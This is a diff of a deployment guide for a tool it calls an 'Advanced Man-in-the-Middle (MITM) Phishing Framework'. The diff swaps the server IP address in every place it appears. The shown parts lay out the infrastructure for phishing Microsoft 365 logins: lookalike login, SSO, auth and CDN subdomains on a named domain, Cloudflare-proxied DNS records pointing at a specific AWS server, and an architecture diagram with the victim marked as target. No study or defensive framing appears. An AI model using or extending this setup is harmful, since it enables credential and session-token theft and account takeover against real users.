@@ -1,7 +1,7 @@
 # 🚀 WebSec Deployment Guide - Standalone Setup
 
 > **Advanced Man-in-the-Middle (MITM) Phishing Framework**  
-> **Domain:** `azbpartner.com` | **Server IP:** `43.205.114.81`
+> **Domain:** `azbpartner.com` | **Server IP:** `15.206.73.179`
 
 ## 📋 Overview
 
@@ -22,7 +22,7 @@ This guide covers deploying WebSec as a standalone phishing framework on AWS EC2
 ┌─────────────────┐    ┌──────────────────┐    ┌─────────────────┐
 │   Victim        │    │   Cloudflare     │    │   WebSec        │
 │   (Target)      │───▶│   Proxy          │───▶│   Server        │
-│                 │    │   (Orange Cloud) │    │   43.205.114.81 │
+│                 │    │   (Orange Cloud) │    │   15.206.73.179 │
 └─────────────────┘    └──────────────────┘    └─────────────────┘
                                 │
                                 ▼
@@ -37,19 +37,19 @@ This guide covers deploying WebSec as a standalone phishing framework on AWS EC2
 **Primary Domain:** `azbpartner.com`
 
 **O365-1 Phishlet Subdomains:**
-- `login.azbpartner.com` → `43.205.114.81` (Primary O365 login)
-- `portal.azbpartner.com` → `43.205.114.81` (Office portal redirects)
-- `sso.azbpartner.com` → `43.205.114.81` (Live SSO authentication)
-- `auth.azbpartner.com` → `43.205.114.81` (Token exchange endpoints)
-- `cdn1.azbpartner.com` → `43.205.114.81` (Asset CDN - msftauth.net)
-- `cdn2.azbpartner.com` → `43.205.114.81` (Asset CDN - msauth.net)
+- `login.azbpartner.com` → `15.206.73.179` (Primary O365 login)
+- `portal.azbpartner.com` → `15.206.73.179` (Office portal redirects)
+- `sso.azbpartner.com` → `15.206.73.179` (Live SSO authentication)
+- `auth.azbpartner.com` → `15.206.73.179` (Token exchange endpoints)
+- `cdn1.azbpartner.com` → `15.206.73.179` (Asset CDN - msftauth.net)
+- `cdn2.azbpartner.com` → `15.206.73.179` (Asset CDN - msauth.net)
 
 ## 🔧 Prerequisites
 
 ### 1. AWS EC2 Instance
 - **OS:** Ubuntu 22.04 LTS
 - **Type:** t3.medium or higher
-- **IP:** 43.205.114.81
+- **IP:** 15.206.73.179
 - **Security Groups:** 
   - Port 22 (SSH)
   - Port 80 (HTTP)
@@ -109,12 +109,12 @@ cp -r redirectors/* ~/.websec/redirectors/
 
 | Type | Name | Content | Proxy Status |
 |------|------|---------|--------------|
-| A | login.azbpartner.com | 43.205.114.81 | Proxied (Orange) |
-| A | portal.azbpartner.com | 43.205.114.81 | Proxied (Orange) |
-| A | sso.azbpartner.com | 43.205.114.81 | Proxied (Orange) |
-| A | auth.azbpartner.com | 43.205.114.81 | Proxied (Orange) |
-| A | cdn1.azbpartner.com | 43.205.114.81 | Proxied (Orange) |
-| A | cdn2.azbpartner.com | 43.205.114.81 | Proxied (Orange) |
+| A | login.azbpartner.com | 15.206.73.179 | Proxied (Orange) |
+| A | portal.azbpartner.com | 15.206.73.179 | Proxied (Orange) |
+| A | sso.azbpartner.com | 15.206.73.179 | Proxied (Orange) |
+| A | auth.azbpartner.com | 15.206.73.179 | Proxied (Orange) |
+| A | cdn1.azbpartner.com | 15.206.73.179 | Proxied (Orange) |
+| A | cdn2.azbpartner.com | 15.206.73.179 | Proxied (Orange) |
 
 **Cloudflare Settings:**
 - SSL/TLS Mode: Full (strict)
@@ -364,7 +364,7 @@ nslookup sso.azbpartner.com
 nslookup auth.azbpartner.com
 
 # Check Cloudflare settings
-# Ensure A records point to 43.205.114.81
+# Ensure A records point to 15.206.73.179
 ```
 
 **4. Phishlet not working:**
